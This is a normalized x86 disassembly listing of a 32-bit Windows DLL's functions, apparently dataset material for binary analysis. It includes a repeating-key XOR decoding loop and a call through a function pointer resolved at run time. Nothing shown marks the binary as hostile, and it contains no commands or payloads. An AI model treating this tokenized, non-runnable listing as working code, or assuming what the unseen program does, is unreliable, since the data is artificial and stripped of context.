test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
pop esi
leave
retn
lea eax [ ebp - 0xc ]
call sub_10010249
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000253c
inc [ ebp - 0x8 ]
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
sub_1001012d
sub eax [ esp + 0x4 ]
push esi
sar eax 0x2
mov ecx eax
shl ecx 0x2
lea esi [ ecx + edx ]
test eax eax
jbe r-xdata
mov eax esi
pop esi
retn
push ecx
push [ esp + 0xc ]
push ecx
push edx
call sub_100275d0
add esp 0x10
sub_10010154
push ebp
mov ebp esp
mov eax [ ebp + 0x24 ]
sub eax [ ebp + 0x1c ]
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov edx eax
lea eax [ ebp + 0x28 ]
call sub_1000feab
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
dec esi
dec [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
call sub_10010249
mov ebx eax
lea eax [ ebp - 0x8 ]
call sub_10010249
push 0xffffffff
push 0x0
push ebx
mov ecx eax
call sub_1000253c
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x2c ]
mov esi [ ebp + 0x24 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] eax
cmp edi esi
je r-xdata
sub_100101cd
push ebp
mov ebp esp
mov eax [ ebp + 0x24 ]
sub eax [ ebp + 0x1c ]
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx eax
lea eax [ ebp + 0x28 ]
call sub_1000fa80
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
call sub_10010249
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_10010249
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_1000253c
inc [ ebp - 0xc ]
inc [ ebp - 0x4 ]
jmp r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x2c ]
mov esi [ ebp + 0x24 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] esi
je r-xdata
sub_10010249
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
jmp r-xdata
call sub_10027827
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor ecx ecx
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov esi [ esi ]
test esi esi
je r-xdata
call sub_10027827
mov eax [ eax + 0x1c ]
add eax [ ecx + 0x18 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ eax + 0x14 ] edi
ja r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
mov eax [ eax + edi * 4 ]
pop edi
pop esi
retn
sub edi [ eax + 0x14 ]
sub_100102b2
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005120f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov edi edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] eax
call sub_10001e9f
mov eax [ edi + 0x14 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
push 0xf
pop esi
push ebx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] esi
call sub_100021a7
mov ecx [ esp + 0x14 ]
push edi
lea edx [ esp + 0x58 ]
mov [ esp + 0x84 ] ebx
call sub_10010717
pop ecx
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x54 ] esi
call sub_100021a7
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x84 ] 0x1
call sub_1001057b
pop ecx
push ebx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] esi
call sub_100021a7
lea eax [ esp + 0x38 ]
push eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x84 ] 0x2
call sub_10010517
pop ecx
mov ecx [ esp + 0x18 ]
push 0xffffffff
push ebx
mov eax edi
push eax
call sub_100021c3
push ebx
push 0x1
mov ecx edi
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x40 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x5c ]
call sub_100020e2
sub_100103cd
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100511cf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x64 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] eax
call sub_10001e9f
push 0xf
pop esi
xor ebx ebx
push ebx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] esi
call sub_100021a7
lea eax [ esp + 0x14 ]
push edi
push eax
mov [ esp + 0x88 ] ebx
call sub_10017316
pop ecx
pop ecx
mov [ esp + 0x80 ] 0x1
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
push ebx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] esi
call sub_100021a7
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x84 ] 0x2
call sub_1001063b
pop ecx
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x54 ] esi
call sub_100021a7
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x1c ]
push eax
lea edx [ esp + 0x3c ]
mov [ esp + 0x84 ] 0x3
call sub_10010717
pop ecx
mov ecx [ esp + 0x10 ]
push 0xffffffff
push ebx
lea eax [ esp + 0x40 ]
push eax
call sub_100021c3
push ebx
push 0x1
lea ecx [ esp + 0x40 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x24 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x5c ]
call sub_100020e2
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x64 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
call sub_1000af0a
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x60 ]
call sub_100021c3
mov [ esp + 0x80 ] bl
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
sub_10010517
push 0x40
mov eax sub_1005118a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push ecx
push eax
lea esi [ ebp - 0x30 ]
call sub_100172e8
lea eax [ ebp - 0x4c ]
xor esi esi
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] esi
call sub_1001743a
pop ecx
push 0xffffffff
push esi
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100021c3
push esi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_100020e2
lea ecx [ ebp - 0x30 ]
call sub_10017303
call sub_1002b392
retn
sub_1001057b
push 0x70
mov eax sub_100503b9
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x14 ]
xor edi edi
push edi
shl eax 0x6
push eax
lea ecx [ ebp - 0x30 ]
call sub_10005cd0
mov [ ebp - 0x4 ] edi
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x14 ]
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push eax
push esi
lea eax [ ebp - 0x34 ]
call sub_1001aa55
cmp eax edi
je r-xdata
lea ebx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ebx [ ebp - 0x2c ]
jae r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push edi
push eax
lea esi [ ebp - 0x54 ]
call sub_1000b8f5
mov ecx [ ebp - 0x38 ]
push 0xffffffff
push edi
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100021c3
push edi
push 0x1
mov ecx esi
call sub_100020e2
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
call sub_1002b392
retn
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_1002ae74
sub_1001063b
push 0x70
mov eax sub_100503b9
call sub_1002b30f
mov eax [ ebp + 0x8 ]
push 0x20
pop edi
xor ebx ebx
mov esi ecx
push ebx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] 0xf
call sub_100021a7
mov [ ebp - 0x4 ] ebx
lea ecx [ esi + 0x4 ]
mov edx ecx
mov edx [ esi + 0x4 ]
jmp r-xdata
push eax
push edx
lea eax [ ebp - 0x34 ]
call sub_1001aacb
cmp eax 0xfffffff8
je r-xdata
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov eax [ esi + 0x14 ]
add edi edi
imul eax edi
push ebx
push eax
lea ecx [ ebp - 0x30 ]
call sub_1000133e
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x14 ]
jb r-xdata
cmp eax ebx
je r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push ebx
push eax
lea esi [ ebp - 0x54 ]
call sub_1000b8f5
mov ecx [ ebp - 0x38 ]
push 0xffffffff
push ebx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100021c3
push ebx
push 0x1
mov ecx esi
call sub_100020e2
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
call sub_1002b392
retn
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_1002ae74
sub_10010717
push 0x58
mov eax sub_10050386
call sub_1002b2a6
mov ebx ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x20 ] eax
test eax eax
ja r-xdata
mov eax [ esi + 0x14 ]
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x1c ] eax
call sub_1000133e
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push r--data
lea ecx [ ebp - 0x3c ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x64 ]
push eax
call sub_1002ae74
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add ebx 0x4
mov [ ebp - 0x18 ] ebx
mov edx [ ebx + 0x4 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
cmp [ ebx + 0x18 ] 0x10
mov [ ebp - 0x14 ] eax
jb r-xdata
call sub_1002b37e
retn
mov edi ecx
sub edi eax
jmp r-xdata
xor esi esi
cmp [ ebp - 0x1c ] esi
jbe r-xdata
lea ecx [ esi + eax ]
xor edx edx
mov eax esi
div [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov al [ edx + eax ]
xor al [ edi + ecx ]
inc esi
mov [ ecx ] al
cmp esi [ ebp - 0x1c ]
jb r-xdata
mov eax [ ebp - 0x14 ]
sub_10010855
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052448
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x14 ]
test eax eax
jbe r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ ecx + 0x1c ] 0x8
jb r-xdata
add ecx 0x8
mov ecx [ ecx + 0x8 ]
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push ecx
lea eax [ esp + 0x10 ]
push eax
push 0x2
pop ecx
call sub_1000ea44
and [ esp + 0xa0 ] 0x0
cmp [ esi + 0x18 ] 0x10
mov eax [ esi + 0x14 ]
jb r-xdata
push eax
push esi
lea eax [ esp + 0x14 ]
push eax
call sub_100109de
or [ esp + 0xa0 ] 0xffffffff
lea eax [ esp + 0xc ]
call sub_1000e14d
sub_100108f7
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005241c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc0 ]
mov [ fs : 0x0 ] eax
cmp [ ecx + 0x1c ] 0x8
jb r-xdata
add ecx 0x8
mov ecx [ ecx + 0x8 ]
jmp r-xdata
or [ esp + 0xc8 ] 0xffffffff
lea eax [ esp + 0x14 ]
call sub_1000e061
mov ecx [ esp + 0xc0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea esi [ esp + 0x14 ]
call sub_1000e1e8
lea esi [ esp + 0xa4 ]
lea eax [ esp + 0x14 ]
call sub_1000e257
mov esi [ eax + 0x8 ]
add esi [ eax ]
sub esp 0x18
mov eax esp
lea ebx [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
call sub_1000e169
push edi
mov edi [ ebp + 0x8 ]
push esi
mov ecx edi
call sub_1000133e
cmp [ edi + 0x18 ] 0x10
jb r-xdata
push ecx
lea eax [ esp + 0x18 ]
xor ecx ecx
push eax
inc ecx
call sub_1000e28c
xor edi edi
mov [ esp + 0xc8 ] edi
cmp [ esp + 0x68 ] edi
je r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
push esi
push edi
lea eax [ esp + 0x1c ]
push eax
call sub_1000bf77
sub_100109de
push 0x10
mov eax sub_100523f6
call sub_1002b2d9
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000f20a
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] bl
jne r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x20 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_10010a65
mov [ ebp - 0x4 ] ebx
jmp sub_10010a65
mov [ ebp - 0x14 ] 0x4
sub_10010a35
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_100080a5
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10010a65
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
call sub_1000f1ac
mov eax edi
call sub_1002b37e
retn 0xc
push ebx
push [ ebp - 0x14 ]
call sub_100081bf
sub_10010a91
push 0x0
mov eax sub_100523d1
call sub_1002b2a6
mov edi [ ebp + 0x8 ]
push 0x4
mov eax edi
call sub_1000d482
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea esi [ edi + 0x18 ]
mov [ edi ] r--data
call sub_10010caf
pop ecx
push [ ebp + 0x10 ]
lea ecx [ edi + 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_100025cf
mov [ edi + 0x50 ] 0x0
and [ edi + 0x54 ] 0x0
and [ edi + 0x58 ] 0x0
mov eax edi
call sub_1002b37e
retn 0xc
sub_10010b00
push 0x4
mov eax sub_10051dea
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
call sub_10010dbd
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x34 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d4bd
call sub_1002b37e
retn
call sub_1000af0a
sub_10010b5c
push 0x48
mov eax sub_1005115f
call sub_1002b2a6
mov ebx ecx
push 0x8
call sub_1002738b
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
lea ecx [ ebx + 0x18 ]
push ecx
mov esi eax
call sub_1001754c
mov esi eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
call sub_10010dff
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1000d3de
add esp 0xc
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
lea esi [ ebx + 0x54 ]
call sub_1000af36
lea eax [ ebp - 0x14 ]
cmp eax esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x18 ]
test ecx ecx
je r-xdata
call sub_1000af0a
push r--data
lea ecx [ ebp - 0x38 ]
call sub_10001ebc
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
push ecx
push eax
call sub_100157e6
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x38 ]
mov edi eax
call sub_100020e2
test edi edi
jne r-xdata
call sub_1000af0a
mov [ ebx + 0x50 ] 0x1
call edi
lea eax [ ebp - 0x1c ]
cmp eax esi
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
push ecx
push eax
call sub_100157e6
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
mov edi eax
call sub_100020e2
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
and [ esi + 0x4 ] 0x0
test ecx ecx
je r-xdata
and [ esi ] 0x0
lea edi [ ebx + 0x34 ]
mov esi r--data
push esi
mov ecx edi
call sub_1000c634
test eax eax
je r-xdata
xor eax eax
call sub_1002b37e
retn
call sub_1000af0a
jmp r-xdata
push esi
mov ecx edi
call sub_100014f8
push edi
call sub_10015e6c
pop ecx
sub_10010caf
push 0x118
mov eax sub_10052396
call sub_1002b30f
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x34 ] eax
cmp [ eax + 0x14 ] edi
ja r-xdata
push r--data
lea ecx [ ebp - 0x74 ]
call sub_10001362
lea eax [ ebp - 0x30 ]
push eax
lea ebx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_10015bc4
pop ecx
push edi
xor edi edi
inc edi
push edi
mov ecx ebx
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x58 ]
call sub_10015d8f
push r--data
push eax
push esi
mov [ ebp - 0x4 ] 0x5
call sub_100098f3
add esp 0xc
push 0x0
push edi
mov ecx ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x58 ]
call sub_10001ebc
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x9c ]
push eax
call sub_1002ae74
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x124 ]
push eax
push 0x22
pop ecx
call sub_1000ea44
push [ ebp - 0x34 ]
lea eax [ ebp - 0x124 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_1000ee0f
pop ecx
pop ecx
lea eax [ ebp - 0x124 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000e14d
push 0x0
push edi
lea ecx [ ebp - 0x30 ]
call sub_1000264e
mov eax esi
call sub_1002b392
retn
sub_10010dbd
push 0x4
mov eax sub_10051122
call sub_1002b2d9
mov esi ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x18 ]
push eax
call sub_10015e6c
pop ecx
add esi 0x34
push r--data
mov ecx esi
call sub_1000c634
test eax eax
je r-xdata
call sub_1002b37e
retn
push esi
call sub_10015e6c
pop ecx
sub_10010dff
push 0x4
mov eax sub_1004f9f5
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_10010ea8
push 0x5c
mov eax sub_100533a9
call sub_1002b30f
push r--data
push [ edi + 0x4 ]
call sub_1000993a
pop ecx
pop ecx
mov esi eax
call sub_10002cf6
push r--data
push [ edi + 0x4 ]
call sub_1000993a
pop ecx
pop ecx
mov esi eax
call sub_10002cf6
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
xor esi esi
inc esi
push esi
lea eax [ ebp - 0x2c ]
push eax
xor ebx ebx
mov eax edi
mov [ ebp - 0x4 ] ebx
call sub_10011067
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov ecx edi
call sub_1001127b
push edi
call sub_100112f5
mov ecx edi
call sub_100114cd
mov ecx edi
call sub_10011578
mov ecx edi
call sub_10011623
push edi
call sub_1001180e
mov ecx edi
call sub_1001192f
push edi
call sub_100119b5
push edi
call sub_10011b7f
push edi
call sub_10011cdf
mov ecx edi
call sub_10011e6e
mov ecx edi
call sub_10012605
push edi
call sub_10013525
lea eax [ ebp - 0x48 ]
call sub_10017748
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
call sub_10001362
push ebx
lea eax [ ebp - 0x2c ]
push eax
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_100137db
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x48 ]
call sub_1000264e
lea eax [ ebp - 0x2c ]
call sub_10017760
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001362
push ebx
lea eax [ ebp - 0x48 ]
push eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_100137db
push ebx
push esi
lea ecx [ ebp - 0x48 ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
lea eax [ ebp - 0x2c ]
call sub_10017778
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x5
call sub_10001362
push esi
lea eax [ ebp - 0x48 ]
push eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x6
call sub_100137db
push ebx
push esi
lea ecx [ ebp - 0x48 ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
push edi
call sub_10013851
push r--data
lea ecx [ ebp - 0x64 ]
call sub_10001362
lea eax [ ebp - 0x64 ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x7
call sub_100110a9
push ebx
push esi
lea ecx [ ebp - 0x64 ]
call sub_1000264e
call sub_1002b392
retn
sub_10011067
push esi
push r--data
push ecx
push [ esp + 0x10 ]
mov esi eax
push ecx
push r--data
push [ esi + 0x4 ]
call sub_1000993a
add esp 0xc
push eax
call sub_100060a3
add esp 0xc
push eax
call sub_1000993a
cmp [ esp + 0x14 ] 0x0
pop ecx
pop ecx
je r-xdata
pop esi
retn 0x8
mov esi [ esi + 0x4 ]
call sub_10002cf6
sub_100110a9
push ecx
push esi
push r--data
push ecx
push [ esp + 0x14 ]
push ecx
push r--data
push [ eax + 0x4 ]
call sub_1000993a
add esp 0xc
push eax
call sub_100060a3
add esp 0xc
push eax
call sub_1000993a
pop ecx
pop ecx
mov esi eax
call sub_10002cf6
pop esi
pop ecx
retn 0x4
sub_100110e3
push ebp
mov ebp esp
cmp [ esi + 0x18 ] 0x8
push ebx
mov ebx [ esi + 0x14 ]
push edi
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_10013912
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
push eax
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push [ ebp + 0xc ]
push ebx
push edi
call sub_1000c75e
mov eax [ ebp + 0xc ]
add edi [ eax + 0x14 ]
cmp [ esi + 0x18 ] 0x8
mov ebx [ esi + 0x14 ]
jb r-xdata
pop edi
pop ebx
pop ebp
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push ebx
push eax
mov eax edi
sub_1001113e
push 0x5c
mov eax sub_10052ccd
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_100025cf
xor ebx ebx
push r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] ebx
call sub_10001362
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001362
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_100110e3
pop ecx
pop ecx
push ebx
push 0x1
mov ecx esi
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001362
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x4
